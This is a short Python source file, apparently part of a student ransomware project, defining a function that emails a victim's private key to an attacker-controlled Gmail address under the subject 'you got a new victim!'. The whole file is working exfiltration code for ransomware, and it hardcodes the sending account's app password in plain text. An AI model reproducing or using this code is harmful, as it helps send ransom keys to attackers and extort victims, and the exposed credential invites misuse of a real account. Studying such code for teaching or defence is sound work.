import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

def send_mail(privateKeyBytes, private_name):
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    sender_email = "cs440emailsender@gmail.com"
    sender_password = "vllj upnr xupa jjuh"

    # Create a MIME object for the email
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = "cs440emailreceiver@gmail.com"
    message["Subject"] = "you got a new victim!"

    # Add email body
    message.attach(MIMEText("you got a new victim, here's their key!"))
       
    # Attach the private key bytes directly
    attachment = MIMEApplication(privateKeyBytes)

    # Attach the file
    attachment.add_header(
        "content-disposition", "attachment", filename=private_name
    )
    message.attach(attachment)
    
    try:
        # Connect to the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)

        # Start TLS encryption (if using TLS)
        server.starttls()

        # Log in to your email account
        server.login(sender_email, sender_password)

        # Send the email
        server.sendmail(sender_email, "cs440emailreceiver@gmail.com", message.as_string())

        # Quit the server
        server.quit()

        print("Email sent successfully!")

    except Exception as e:
        print(f"Error: {str(e)}")
